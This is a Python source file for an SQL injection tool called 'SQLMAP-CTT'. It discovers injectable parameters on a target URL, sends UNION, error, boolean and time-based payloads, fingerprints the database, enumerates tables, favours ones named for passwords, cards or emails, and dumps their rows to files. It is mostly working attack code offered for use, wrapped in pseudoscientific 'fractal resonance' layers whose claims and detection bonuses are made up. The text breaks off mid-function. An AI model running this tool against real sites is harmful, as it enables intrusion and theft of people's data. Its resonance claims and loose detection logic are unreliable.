#!/usr/bin/env python3
"""
🔥 SQLMAP-CTT v2.3: Convergent Time Theory Enhanced SQL Injection
33-Layer Fractal Resonance Payload Generation & Temporal Inference
With ROBUST Data Extraction Engine

Author: Americo Simoes (CTT Research Group)
Email: amexsimoes@gmail.com
Copyright: © 2026 Americo Simoes. All rights reserved.
Date: 2026
ROBUST VERSION WITH ERROR HANDLING
"""

import numpy as np
import hashlib
import time
import struct
import random
import concurrent.futures
import subprocess
import threading
import json
import csv
import sys
import os
import re
import argparse
from typing import Dict, List, Any, Optional, Tuple, Union
from dataclasses import dataclass
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote
import html

# Import requests at the TOP of the file
import requests
from scipy.fft import fft, fftfreq

# ============================================================================
# CTT 33-LAYER FRACTAL ENGINE v2.3
# ============================================================================
CTT_ALPHA = 0.0302011
CTT_LAYERS = 33
CTT_PRIMES = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137]

@dataclass
class CTTResult:
    """Container for CTT analysis results"""
    confidence: float
    resonance: float
    prime_resonance: bool
    dominant_frequency: float
    layer_correlation: float
    temporal_signature: str
    vulnerable: bool = False

class CTT_FractalEngine:
    def __init__(self, alpha: float = CTT_ALPHA, layers: int = CTT_LAYERS, custom_primes: List[int] = None):
        self.alpha = alpha
        self.layers = layers
        
        # Use custom primes if provided, otherwise default
        if custom_primes:
            self.primes = custom_primes[:layers]
        else:
            self.primes = [p for p in CTT_PRIMES if p < 100][:layers]
        
        # Initialize 33-layer resonance matrix
        self.layer_weights = np.exp(-self.alpha * np.arange(self.layers))
        self.layer_phases = np.exp(2j * np.pi * np.arange(self.layers) / self.layers)
        
        # Fractal resonance cache
        self.resonance_cache: Dict[int, List[float]] = {}
        self.temporal_patterns: Dict[int, np.ndarray] = {}
        
        # Resonance frequency (optional)
        self.resonance_freq = 587000  # Default resonance frequency
        
        # Generate initial patterns
        self._initialize_patterns()
    
    def set_resonance_frequency(self, freq: float):
        """Set custom resonance frequency"""
        self.resonance_freq = freq
    
    def _initialize_patterns(self) -> None:
        """Initialize temporal patterns for each layer"""
        for layer in range(self.layers):
            pattern = []
            for i in range(10):  # 10 sample points
                # Use resonance frequency if set
                if self.resonance_freq > 0:
                    freq_component = np.sin(2 * np.pi * i / (self.resonance_freq / 1000))
                else:
                    freq_component = 0
                
                value = np.sin(2 * np.pi * i / (self.primes[layer] if layer < len(self.primes) else 13))
                value += self.alpha * layer * np.cos(2 * np.pi * i / 13)
                value += freq_component * 0.1  # Add resonance frequency component
                pattern.append(value)
            self.temporal_patterns[layer] = np.array(pattern)
    
    def generate_fractal_payload(self, base_payload: bytes, target_layer: Optional[int] = None) -> Union[List[bytes], bytes]:
        """
        Generate 33-layer fractal payload with temporal resonance
        """
        if target_layer is None:
            fractal_payloads = []
            for layer in range(self.layers):
                payload = self._apply_layer_resonance(base_payload, layer)
                fractal_payloads.append(payload)
            return fractal_payloads
        else:
            layer = target_layer % self.layers
            return self._apply_layer_resonance(base_payload, layer)
    
    def _apply_layer_resonance(self, payload: bytes, layer: int) -> bytes:
        """Apply layer-specific resonance transformations"""
        if layer >= len(self.primes):
            prime = 13  # Fallback prime
        else:
            prime = self.primes[layer]
        
        # Alpha-dispersion encoding
        dispersed = bytearray()
        for i, byte in enumerate(payload):
            # Apply fractal transformation with resonance frequency
            transform = (
                byte ^ 
                ((prime * int(1/self.alpha)) & 0xFF) ^
                ((layer * 137) & 0xFF) ^
                ((int(self.resonance_freq) >> (i % 8)) & 0xFF)
            )
            dispersed.append(transform % 256)
        
        # Add resonance watermark
        watermark = self._generate_resonance_watermark(layer)
        dispersed.extend(watermark)
        
        # Apply temporal padding based on layer weight
        padding_size = max(1, int(self.layer_weights[layer] * 50))
        dispersed.extend(os.urandom(padding_size))
        
        return bytes(dispersed)
    
    def _generate_resonance_watermark(self, layer: int) -> bytes:
        """Generate unique resonance watermark for each layer"""
        if layer >= len(self.primes):
            prime = 13
        else:
            prime = self.primes[layer]
            
        seed = f"{layer}{prime}{time.time():.6f}{self.alpha}{self.resonance_freq}"
        hash_digest = hashlib.sha256(seed.encode()).digest()[:16]
        
        # Encode with layer-specific prime and resonance frequency
        watermark = bytearray()
        for i, byte in enumerate(hash_digest):
            encoded = (byte + prime + layer + (int(self.resonance_freq) & 0xFF)) % 256
            watermark.append(encoded)
        
        return bytes(watermark)

# ============================================================================
# ROBUST DATABASE EXTRACTION ENGINE
# ============================================================================
class DatabaseExtractor:
    def __init__(self, injection_engine):
        self.engine = injection_engine
        self.db_info = {'type': 'Unknown', 'version': 'Unknown', 'timestamp': time.time()}
        self.tables = []
        self.columns = {}
        self.extracted_data = {}
        self.session = injection_engine.session
        
    def send_direct_query(self, query: str) -> Optional[List[str]]:
        """Send a direct SQL query and parse the response"""
        # Use the first injection point
        if not self.engine.injection_points:
            self.engine.discover_injection_points()
        
        if not self.engine.injection_points:
            return None
        
        point = self.engine.injection_points[0]
        
        # Build payload - try different UNION formats
        payloads = [
            f"' UNION SELECT NULL,({query})--",
            f"' UNION SELECT ({query}),NULL--",
            f"' UNION SELECT NULL,CONCAT('RESULT:',({query}))--",
        ]
        
        for payload in payloads:
            try:
                response = self.engine._send_request(point['parameter'], payload, point['type'], 0)
                if response and response.status_code == 200:
                    results = self._parse_union_response(response.text)
                    if results:
                        return results
            except Exception as e:
                continue
        
        return None
    
    def _parse_union_response(self, html_content: str) -> List[str]:
        """Extract data from UNION query response"""
        results = []
        
        # First, try to find SQL errors or database output
        sql_patterns = [
            r'RESULT:([^<]+)',
            r'>([^<>]{5,200})<',
            r'\[([^\]]+)\]',
            r"'([^']{5,200})'",
        ]
        
        # Clean HTML
        html_content = re.sub(r'<script.*?</script>', '', html_content, flags=re.DOTALL | re.IGNORECASE)
        html_content = re.sub(r'<style.*?</style>', '', html_content, flags=re.DOTALL | re.IGNORECASE)
        html_content = re.sub(r'<!--.*?-->', '', html_content, flags=re.DOTALL)
        
        for pattern in sql_patterns:
            matches = re.findall(pattern, html_content, re.DOTALL | re.IGNORECASE)
            for match in matches:
                # Clean the text
                text = re.sub(r'<[^>]+>', '', match)
                text = re.sub(r'\s+', ' ', text).strip()
                
                # Filter out common HTML/navigation text
                if (len(text) > 3 and 
                    not text.startswith('http') and
                    'DOCTYPE' not in text and
                    'html' not in text.lower() and
                    'body' not in text.lower() and
                    'div' not in text.lower() and
                    'span' not in text.lower() and
                    'class=' not in text.lower() and
                    'id=' not in text.lower()):
                    
                    results.append(text)
        
        # Remove duplicates
        seen = set()
        unique_results = []
        for r in results:
            if r not in seen and len(r) > 2:
                seen.add(r)
                unique_results.append(r)
        
        return unique_results
    
    def fingerprint_database(self) -> Dict[str, Any]:
        """Robust database fingerprinting with fallbacks"""
        print("[+] Fingerprinting database...")
        
        db_type = "Unknown"
        version = "Unknown"
        
        # Test queries that work across multiple databases
        test_queries = [
            ("SELECT 'mysql'", "MySQL"),
            ("SELECT 'postgresql'", "PostgreSQL"),
            ("SELECT 'mssql'", "MSSQL"),
            ("SELECT 'sqlite'", "SQLite"),
            ("SELECT 'oracle'", "Oracle"),
        ]
        
        # First try to identify by error messages
        error_payload = "' AND 1=CONVERT(int, @@version)--"
        point = self.engine.injection_points[0] if self.engine.injection_points else None
        if point:
            try:
                response = self.engine._send_request(point['parameter'], error_payload, point['type'], 0)
                if response:
                    resp_text = response.text.lower()
                    if 'mysql' in resp_text:
                        db_type = "MySQL"
                    elif 'postgres' in resp_text:
                        db_type = "PostgreSQL"
                    elif 'microsoft' in resp_text or 'sql server' in resp_text:
                        db_type = "MSSQL"
                    elif 'sqlite' in resp_text:
                        db_type = "SQLite"
                    elif 'oracle' in resp_text:
                        db_type = "Oracle"
                    
                    # Try to extract version
                    version_match = re.search(r'(\d+\.\d+\.\d+|\d+\.\d+)', resp_text)
                    if version_match:
                        version = version_match.group(1)
            except:
                pass
        
        # If error-based didn't work, try UNION-based
        if db_type == "Unknown":
            for query, db_name in test_queries:
                result = self.send_direct_query(query)
                if result:
                    for r in result:
                        if db_name.lower() in r.lower():
                            db_type = db_name
                            break
                if db_type != "Unknown":
                    break
        
        # Get version if we identified DB type
        if db_type != "Unknown":
            version_queries = {
                "MySQL": "SELECT @@version",
                "PostgreSQL": "SELECT version()",
                "MSSQL": "SELECT @@version",
                "SQLite": "SELECT sqlite_version()",
                "Oracle": "SELECT banner FROM v$version WHERE rownum=1"
            }
            
            if db_type in version_queries:
                result = self.send_direct_query(version_queries[db_type])
                if result:
                    for r in result:
                        version_match = re.search(r'(\d+\.\d+\.\d+|\d+\.\d+)', r)
                        if version_match:
                            version = version_match.group(1)
                            break
        
        self.db_info = {
            'type': db_type,
            'version': version,
            'timestamp': time.time()
        }
        
        print(f"[+] Database identified: {db_type} {version}")
        return self.db_info
    
    def get_current_user(self) -> str:
        """Get current database user"""
        print("[+] Getting current user...")
        
        queries = [
            "SELECT user()",
            "SELECT current_user",
            "SELECT system_user",
            "SELECT session_user",
            "SELECT USER",
        ]
        
        for query in queries:
            result = self.send_direct_query(query)
            if result:
                for r in result:
                    # Look for user-like strings
                    clean_r = r.strip()
                    if '@' in clean_r or re.match(r'^[a-zA-Z0-9_]+$', clean_r):
                        if len(clean_r) > 1 and clean_r != 'NULL':
                            return clean_r
        
        return "Unknown"
    
    def get_current_database(self) -> str:
        """Get current database name"""
        print("[+] Getting current database...")
        
        queries = [
            "SELECT database()",
            "SELECT db_name()",
            "SELECT current_database()",
            "SELECT DATABASE()",
        ]
        
        for query in queries:
            result = self.send_direct_query(query)
            if result:
                for r in result:
                    # Look for database-like strings
                    clean_r = r.strip()
                    if re.match(r'^[a-zA-Z0-9_]+$', clean_r) and len(clean_r) > 2:
                        if clean_r.lower() not in ['null', 'test', 'mysql']:
                            return clean_r
        
        return "Unknown"
    
    def list_databases(self) -> List[str]:
        """List all databases with fallback queries"""
        print("[+] Listing databases...")
        
        databases = []
        
        # Try different database system queries
        db_queries = [
            ("MySQL", "SELECT schema_name FROM information_schema.schemata"),
            ("PostgreSQL", "SELECT datname FROM pg_database"),
            ("MSSQL", "SELECT name FROM master..sysdatabases"),
            ("Generic", "SHOW DATABASES"),
        ]
        
        for db_name, query in db_queries:
            # Skip if we know DB type and it doesn't match
            if self.db_info['type'] != 'Unknown' and self.db_info['type'] != db_name and db_name != 'Generic':
                continue
            
            result = self.send_direct_query(query)
            if result:
                for r in result:
                    clean_r = r.strip()
                    # Filter system databases
                    if (clean_r and len(clean_r) > 2 and
                        not clean_r.startswith('information_schema') and
                        not clean_r.startswith('mysql') and
                        not clean_r.startswith('performance_schema') and
                        not clean_r.startswith('sys') and
                        not clean_r.startswith('master') and
                        not clean_r.startswith('tempdb') and
                        not clean_r.startswith('model') and
                        not clean_r.startswith('msdb')):
                        databases.append(clean_r)
                
                if databases:
                    break
        
        return databases[:10]  # Limit to 10 databases
    
    def list_tables(self, database: str = None) -> List[str]:
        """List tables in database - ROBUST VERSION"""
        print(f"[+] Listing tables in database: {database or 'current'}")
        
        tables = []
        
        # Generic table listing queries that work in many databases
        generic_queries = [
            "SHOW TABLES",
            "SELECT table_name FROM information_schema.tables",
            "SELECT name FROM sysobjects WHERE xtype='U'",
            "SELECT tablename FROM pg_tables",
        ]
        
        for query in generic_queries:
            result = self.send_direct_query(query)
            if result:
                for r in result:
                    clean_r = r.strip()
                    if clean_r and len(clean_r) > 2:
                        tables.append(clean_r)
                
                if tables:
                    break
        
        # Filter for interesting tables
        interesting_tables = []
        sensitive_keywords = ['user', 'admin', 'customer', 'product', 'order', 'account', 
                             'login', 'password', 'credit', 'card', 'email', 'member']
        
        for table in tables:
            table_lower = table.lower()
            for keyword in sensitive_keywords:
                if keyword in table_lower:
                    interesting_tables.append(table)
                    break
        
        # If we found interesting tables, use those. Otherwise use all tables.
        if interesting_tables:
            self.tables = interesting_tables[:10]  # Limit to 10 interesting tables
        else:
            self.tables = tables[:10]  # Limit to 10 tables
        
        return self.tables
    
    def list_columns(self, table: str) -> List[str]:
        """List columns in a table - ROBUST VERSION"""
        print(f"[+] Listing columns in table: {table}")
        
        columns = []
        
        # Try different column listing queries
        column_queries = [
            f"SHOW COLUMNS FROM {table}",
            f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
            f"SELECT name FROM syscolumns WHERE id=OBJECT_ID('{table}')",
            f"DESCRIBE {table}",
        ]
        
        for query in column_queries:
            result = self.send_direct_query(query)
            if result:
                for r in result:
                    # Extract column name (first word usually)
                    clean_r = r.strip().split()[0] if ' ' in r.strip() else r.strip()
                    if clean_r and len(clean_r) > 2:
                        columns.append(clean_r)
                
                if columns:
                    break
        
        self.columns[table] = columns
        return columns
    
    def extract_table_data(self, table: str, columns: List[str] = None, limit: int = 20) -> List[Dict]:
        """Extract data from a table - ROBUST VERSION"""
        print(f"[+] Extracting data from table: {table}")
        
        if not columns:
            columns = self.list_columns(table)
        
        if not columns:
            print(f"[!] No columns found for table {table}")
            return []
        
        data = []
        
        # Try different extraction methods
        # Method 1: Direct SELECT with CONCAT
        col_list = ",".join(columns)
        queries = [
            f"SELECT CONCAT_WS('|',{col_list}) FROM {table} LIMIT {limit}",
            f"SELECT {col_list} FROM {table} LIMIT {limit}",
            f"SELECT TOP {limit} {col_list} FROM {table}",
            f"SELECT * FROM {table} LIMIT {limit}",
        ]
        
        for query in queries:
            result = self.send_direct_query(query)
            if result:
                for row in result:
                    if '|' in row:
                        values = row.split('|')
                        if len(values) == len(columns):
                            row_dict = {columns[i]: values[i] for i in range(len(columns))}
                            data.append(row_dict)
                    elif row.strip():
                        # Try to parse as individual values
                        # This is a simple fallback for single column results
                        row_dict = {columns[0]: row}
                        data.append(row_dict)
                
                if data:
                    break
        
        self.extracted_data[table] = data
        print(f"[+] Extracted {len(data)} rows from {table}")
        return data
    
    def search_for_data(self, search_term: str) -> Dict[str, List[Dict]]:
        """Search for specific data across tables"""
        print(f"[+] Searching for: {search_term}")
        
        results = {}
        
        # First, ensure we have tables
        if not self.tables:
            self.list_tables()
        
        if not self.tables:
            return results
        
        # Search in first 3 tables only (for performance)
        for table in self.tables[:3]:
            columns = self.list_columns(table)
            if not columns:
                continue
            
            # Build search conditions for each column
            conditions = []
            for col in columns:
                conditions.append(f"{col} LIKE '%{search_term}%'")
            
            where_clause = " OR ".join(conditions)
            col_list = ",".join(columns)
            
            # Try different query formats
            queries = [
                f"SELECT CONCAT_WS('|',{col_list}) FROM {table} WHERE {where_clause} LIMIT 5",
                f"SELECT {col_list} FROM {table} WHERE {where_clause} LIMIT 5",
            ]
            
            for query in queries:
                table_results = []
                result = self.send_direct_query(query)
                if result:
                    for row in result:
                        if '|' in row:
                            values = row.split('|')
                            if len(values) == len(columns):
                                row_dict = {columns[i]: values[i] for i in range(len(columns))}
                                table_results.append(row_dict)
                        elif row.strip():
                            row_dict = {columns[0]: row}
                            table_results.append(row_dict)
                    
                    if table_results:
                        results[table] = table_results
                        break
        
        return results
    
    def save_extracted_data(self, output_dir: str = "extracted_data"):
        """Save extracted data to files"""
        os.makedirs(output_dir, exist_ok=True)
        
        timestamp = int(time.time())
        
        # Save database info
        with open(f"{output_dir}/database_info_{timestamp}.json", 'w') as f:
            json.dump(self.db_info, f, indent=2)
        
        # Save tables list
        with open(f"{output_dir}/tables_{timestamp}.txt", 'w') as f:
            for table in self.tables:
                f.write(f"{table}\n")
        
        # Save columns for each table
        with open(f"{output_dir}/columns_{timestamp}.json", 'w') as f:
            json.dump(self.columns, f, indent=2)
        
        # Save extracted data
        for table, data in self.extracted_data.items():
            if data:
                # Save as JSON
                with open(f"{output_dir}/{table}_{timestamp}.json", 'w') as f:
                    json.dump(data, f, indent=2)
                
                # Save as CSV
                with open(f"{output_dir}/{table}_{timestamp}.csv", 'w', newline='') as f:
                    if data and isinstance(data[0], dict):
                        writer = csv.DictWriter(f, fieldnames=data[0].keys())
                        writer.writeheader()
                        writer.writerows(data)
                
                print(f"[+] Saved {len(data)} rows from {table} to {output_dir}/")
        
        return output_dir

# ============================================================================
# 33-LAYER SQL INJECTION ENGINE WITH ROBUST EXTRACTION
# ============================================================================
class CTT_SQLInjectionEngine:
    def __init__(self, target_url: str, timeout: int = 10, alpha: float = 0.0302011, 
                 custom_primes: List[int] = None, resonance_freq: float = 587000,
                 temporal_threads: int = 11, post_data: Optional[str] = None,
                 technique: str = "auto", extract_depth: int = 0):
        self.target_url = target_url
        self.timeout = timeout
        self.temporal_threads = temporal_threads
        self.post_data_str = post_data
        self.technique = technique
        self.extract_depth = extract_depth
        
        # Initialize extractor
        self.extractor = None
        
        # Parse POST data if provided
        self.post_data_dict = {}
        if post_data:
            try:
                parsed = parse_qs(post_data)
                for key, values in parsed.items():
                    if values:
                        self.post_data_dict[key] = values[0]
                print(f"[+] Parsed POST data: {len(self.post_data_dict)} parameters")
            except Exception as e:
                print(f"[!] Failed to parse POST data: {e}")
        
        # Initialize CTT engine with custom parameters
        self.fractal_engine = CTT_FractalEngine(
            alpha=alpha,
            layers=33,
            custom_primes=custom_primes
        )
        self.fractal_engine.set_resonance_frequency(resonance_freq)
        
        # Session with improved headers
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 CTT/2.3',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
        # Attack state
        self.injection_points: List[Dict] = []
        self.successful_payloads: Dict[str, Dict] = {}
        self.temporal_signatures: Dict[str, Dict] = {}
        self.layer_performance = {layer: 0.0 for layer in range(33)}
        
        # Statistics
        self.stats = {
            'requests': 0,
            'injections': 0,
            'successful': 0,
            'layers_used': set(),
            'primes_used': set(),
            'start_time': time.time(),
            'alpha': alpha,
            'resonance_freq': resonance_freq,
            'threads': temporal_threads,
            'method': 'POST' if post_data else 'GET/AUTO',
            'technique': technique,
            'extract_depth': extract_depth
        }
        
        # Cache original response
        self.original_response: Optional[requests.Response] = None
        
        # Initialize extractor after engine is fully set up
        self.extractor = DatabaseExtractor(self)
    
    def _send_request(self, param_name: str, payload: str, method: str, layer: int) -> Optional[requests.Response]:
        """Send HTTP request with CTT timing"""
        try:
            # Add CTT timing delay based on layer
            delay = self.fractal_engine.layer_weights[layer] * 0.05
            time.sleep(delay)
            
            if method.upper() == 'POST' or self.post_data_dict:
                # For POST, we need to update the data dictionary
                data_dict = self.post_data_dict.copy() if self.post_data_dict else {}
                data_dict[param_name] = payload
                
                # Send POST request
                response = self.session.post(self.target_url, data=data_dict, timeout=self.timeout)
            else:
                # For GET, parse and modify URL
                parsed = urlparse(self.target_url)
                query_dict = parse_qs(parsed.query)
                query_dict[param_name] = [payload]
                
                # Rebuild URL
                new_query = urlencode(query_dict, doseq=True)
                new_url = parsed._replace(query=new_query).geturl()
                
                response = self.session.get(new_url, timeout=self.timeout)
            
            self.stats['requests'] += 1
            return response
            
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed for layer {layer}: {e}")
            return None
    
    def get_original_response(self) -> Optional[requests.Response]:
        """Get and cache original response"""
        if self.original_response is None:
            try:
                if self.post_data_dict:
                    self.original_response = self.session.post(
                        self.target_url, 
                        data=self.post_data_dict,
                        timeout=self.timeout
                    )
                    print(f"[+] Initial POST request sent with {len(self.post_data_dict)} parameters")
                else:
                    self.original_response = self.session.get(self.target_url, timeout=self.timeout)
                self.stats['requests'] += 1
            except Exception as e:
                print(f"[!] Failed to get original response: {e}")
        return self.original_response
    
    def discover_injection_points(self) -> List[Dict]:
        """Discover potential injection points from URL, forms, and POST data"""
        injection_points = []
        
        try:
            # 1. Parse URL for GET parameters
            parsed = urlparse(self.target_url)
            query_params = parse_qs(parsed.query)
            
            for param in query_params:
                injection_points.append({
                    'parameter': param,
                    'value': query_params[param][0],
                    'type': 'GET',
                    'context': f"URL parameter in {self.target_url}"
                })
            
            # 2. Add POST data parameters if provided
            for param, value in self.post_data_dict.items():
                injection_points.append({
                    'parameter': param,
                    'value': value,
                    'type': 'POST',
                    'context': f"POST parameter '{param}'"
                })
            
            # 3. Try to get page and look for forms (if no POST data specified)
            if not self.post_data_dict:
                response = self.get_original_response()
                if response and response.status_code == 200:
                    # Simple form detection
                    form_patterns = [
                        r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>',
                        r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>',
                        r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>'
                    ]
                    
                    for pattern in form_patterns:
                        matches = re.findall(pattern, response.text, re.IGNORECASE)
                        for match in matches:
                            injection_points.append({
                                'parameter': match,
                                'value': 'test',
                                'type': 'POST',
                                'context': f"Form field '{match}'"
                            })
            
            print(f"[+] Discovered {len(injection_points)} total injection points")
            
        except Exception as e:
            print(f"[!] Error discovering injection points: {e}")
        
        self.injection_points = injection_points
        return injection_points
    
    def test_injection_point(self, param_name: str, param_value: str, method: str = 'GET') -> List[Dict]:
        """Test injection point with CTT-enhanced payloads using temporal threads"""
        results = []
        
        # Select layers to test (use prime layers for resonance)
        target_layers = [0, 7, 13, 19, 29]  # Strategic CTT layers
        
        print(f"[+] Testing {param_name} with {len(target_layers)} CTT layers using {self.temporal_threads} threads")
        
        # Use ThreadPoolExecutor for parallel testing
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.temporal_threads) as executor:
            future_to_layer = {}
            
            for layer in target_layers:
                # Submit testing task for each layer
                future = executor.submit(
                    self._test_layer,
                    param_name,
                    param_value,
                    method,
                    layer
                )
                future_to_layer[future] = layer
            
            # Collect results as they complete
            for future in concurrent.futures.as_completed(future_to_layer):
                layer = future_to_layer[future]
                try:
                    layer_results = future.result()
                    results.extend(layer_results)
                except Exception as e:
                    print(f"[!] Layer {layer} test failed: {e}")
        
        return results
    
    def _test_layer(self, param_name: str, param_value: str, method: str, layer: int) -> List[Dict]:
        """Test a specific CTT layer"""
        results = []
        
        # Generate and test payloads for this layer
        payloads = self._generate_sqli_payloads(param_value, layer)
        
        for payload_idx, payload in enumerate(payloads[:3]):  # Test first 3 per layer
            try:
                # Generate fractal payload
                fractal_payload = self.fractal_engine.generate_fractal_payload(
                    payload.encode('utf-8', errors='ignore'), 
                    layer
                )
                
                # Send request
                start_time = time.time()
                response = self._send_request(param_name, fractal_payload.decode('utf-8', errors='ignore'), method, layer)
                response_time = time.time() - start_time
                
                if response:
                    # Analyze response
                    detection = self._detect_injection(response, response_time, layer)
                    
                    result = {
                        'layer': layer,
                        'payload': payload[:50] + "..." if len(payload) > 50 else payload,
                        'response_time': response_time,
                        'status_code': response.status_code,
                        'vulnerable': detection['vulnerable'],
                        'confidence': detection['confidence'],
                        'prime_layer': layer in self.fractal_engine.primes,
                        'signature': detection['signature']
                    }
                    
                    if detection['vulnerable']:
                        # Store successful payload
                        key = f"{param_name}_{layer}_{payload_idx}"
                        self.successful_payloads[key] = {
                            'layer': layer,
                            'payload': payload,
                            'response_time': response_time,
                            'confidence': detection['confidence'],
                            'signature': detection['signature']
                        }
                        self.layer_performance[layer] += detection['confidence']
                        self.stats['successful'] += 1
                        
                        if layer in self.fractal_engine.primes:
                            self.stats['primes_used'].add(layer)
                    
                    results.append(result)
                    self.stats['injections'] += 1
                    
                    # Respectful delay based on layer weight
                    time.sleep(self.fractal_engine.layer_weights[layer] * 0.1)
                
            except Exception as e:
                print(f"[Layer {layer}] Error: {e}")
                continue
        
        self.stats['layers_used'].add(layer)
        return results
    
    def _generate_sqli_payloads(self, base_value: str, layer: int) -> List[str]:
        """Generate SQL injection payloads with CTT resonance"""
        payloads = []
        
        # Base payloads for all techniques
        base_templates = [
            f"{base_value}'",
            f"{base_value}' OR '1'='1",
            f"{base_value}' AND '1'='1",
            f"{base_value}\"'\"",
            f"{base_value})",
        ]
        
        # Technique-specific payloads
        if self.technique in ['auto', 'error', 'E']:
            base_templates.extend([
                f"{base_value}' AND 1=CONVERT(int, @@version)--",
                f"{base_value}' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
                f"{base_value}' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
            ])
        
        if self.technique in ['auto', 'union', 'U']:
            base_templates.extend([
                f"{base_value}' UNION SELECT NULL,NULL--",
                f"{base_value}' UNION SELECT @@version,NULL--",
                f"{base_value}' UNION SELECT user(),database()--",
            ])
        
        if self.technique in ['auto', 'boolean', 'B']:
            base_templates.extend([
                f"{base_value}' AND 1=1--",
                f"{base_value}' OR 1=1--",
                f"{base_value}' AND 1=2--",
            ])
        
        if self.technique in ['auto', 'time', 'T']:
            sleep_time = 1 + (layer % 3)
            base_templates.extend([
                f"{base_value}' AND SLEEP({sleep_time})--",
                f"{base_value}' OR SLEEP({sleep_time})--",
                f"{base_value}' AND (SELECT * FROM (SELECT(SLEEP({sleep_time})))a)--",
            ])
        
        # Add CTT-enhanced payloads for prime layers
        if layer in self.fractal_engine.primes:
            base_templates.extend([
                f"{base_value}' AND 1=CONVERT(int, (SELECT CONCAT(@@version,0x3a,user(),0x3a,database())))--",
                f"{base_value}' UNION SELECT NULL,CONCAT(table_name,0x3a,column_name) FROM information_schema.columns--",
                f"{base_value}' AND IF(ASCII(SUBSTRING((SELECT user()),1,1))>97, SLEEP(3), 0)--",
            ])
        
        return base_templates
    
    def _detect_injection(self, response: requests.Response, response_time: float, layer: int) -> Dict[str, Any]:
        """Detect SQL injection vulnerability with CTT resonance analysis"""
        detection_signals = []
        
        # 1. Check for SQL errors
        sql_errors = [
            'sql', 'mysql', 'oracle', 'postgres', 'syntax',
            'database', 'query', 'odbc', 'driver', 'procedure',
            'unclosed', 'quotation', 'invalid', 'error',
            'warning', 'mysql_', 'you have an error', 'sqlite',
            'microsoft', 'odbc', 'pdo', 'exception'
        ]
        
        response_lower = response.text.lower()
        for error in sql_errors:
            if error in response_lower:
                detection_signals.append(('sql_error', 0.8))
                break
        
        # 2. Check response time (for time-based)
        if response_time > 2.0:  # Significant delay
            detection_signals.append(('time_delay', 0.7))
        
        # 3. Compare with original response
        original = self.get_original_response()
        if original and original.status_code == 200 and response.status_code == 200:
            length_diff = abs(len(response.text) - len(original.text))
            if length_diff > len(original.text) * 0.5:  # > 50% difference
                detection_signals.append(('boolean_diff', 0.6))
        
        # 4. Check for union patterns
        if 'null' in response_lower or 'union' in response_lower:
            detection_signals.append(('union', 0.9))
        
        # 5. Check for database output
        db_patterns = ['root@', 'localhost', 'version()', '@@version', 'information_schema']
        for pattern in db_patterns:
            if pattern in response.text:
                detection_signals.append(('db_output', 0.85))
                break
        
        # 6. CTT resonance bonus
        if layer in self.fractal_engine.primes:
            detection_signals.append(('prime_resonance', 0.3))
        
        # 7. Resonance frequency detection
        if self.fractal_engine.resonance_freq > 0:
            # Check if response contains patterns related to resonance
            freq_str = str(self.fractal_engine.resonance_freq)
            if any(freq_str[i:i+3] in response.text for i in range(len(freq_str)-2)):
                detection_signals.append(('resonance_pattern', 0.2))
        
        # Calculate confidence
        if detection_signals:
            confidence = min(sum(signal[1] for signal in detection_signals), 1.0)
            signature = hashlib.md5(
                '_'.join([sig[0] for sig in detection_signals]).encode()
            ).hexdigest()[:8]
            
            self.temporal_signatures[signature] = {
                'layer': layer,
                'response_time': response_time,
                'signals': detection_signals,
                'confidence': confidence
            }
            
            vulnerable = confidence >= 0.5  # Lower threshold for better detection
            
            return {
                'vulnerable': vulnerable,
                'confidence': confidence,
                'signature': signature,
                'signals': detection_signals
            }
        
        return {
            'vulnerable': False,
            'confidence': 0.0,
            'signature': '',
            'signals': []
        }
    
    def perform_extraction(self, depth: int = None) -> Dict[str, Any]:
        """Perform data extraction based on depth"""
        if depth is None:
            depth = self.extract_depth
        
        if depth <= 0:
            return {}
        
        print(f"\n[+] Starting CTT Data Extraction (Depth: {depth})")
        print("=" * 60)
        
        extraction_results = {}
        
        # Depth 1: Basic fingerprinting
        if depth >= 1:
            print("[+] Phase 1: Database Fingerprinting")
            db_info = self.extractor.fingerprint_database()
            extraction_results['database_info'] = db_info
            
            if db_info['type'] != "Unknown":
                current_user = self.extractor.get_current_user()
                current_db = self.extractor.get_current_database()
                extraction_results['current_user'] = current_user
                extraction_results['current_database'] = current_db
                print(f"[+] Current User: {current_user}")
                print(f"[+] Current Database: {current_db}")
        
        # Depth 2: Schema enumeration
        if depth >= 2:
            print("\n[+] Phase 2: Schema Enumeration")
            
            # List databases
            databases = self.extractor.list_databases()
            extraction_results['databases'] = databases
            print(f"[+] Found {len(databases)} databases")
            
            # List tables in current database
            tables = self.extractor.list_tables()
            extraction_results['tables'] = tables
            print(f"[+] Found {len(tables)} tables")
            
            # List columns for each table
            for table in tables[:3]:  # Limit to 3 tables
                columns = self.extractor.list_columns(table)
                extraction_results[f'columns_{table}'] = columns
                print(f"  - {table}: {len(columns)} columns")
        
        # Depth 3: Data extraction
        if depth >= 3 and 'tables' in extraction_results:
            print("\n[+] Phase 3: Data Extraction")
            
            for table in extraction_results['tables'][:2]:  # Limit to 2 tables
                print(f"[+] Extracting data from: {table}")
                columns = extraction_results.get(f'columns_{table}', [])
                data = self.extractor.extract_table_data(table, columns, limit=10)
                extraction_results[f'data_{table}'] = data
        
        # Save extracted data
        if extraction_results:
            output_dir = self.extractor.save_extracted_data()
            extraction_results['output_dir'] = output_dir
            print(f"\n[+] Extraction complete! Data saved to: {output_dir}/")
        
        return extraction_results
    
    def search_for_sensitive_data(self, search_terms: List[str] = None):
        """Search for sensitive data in the database"""
        if not search_terms:
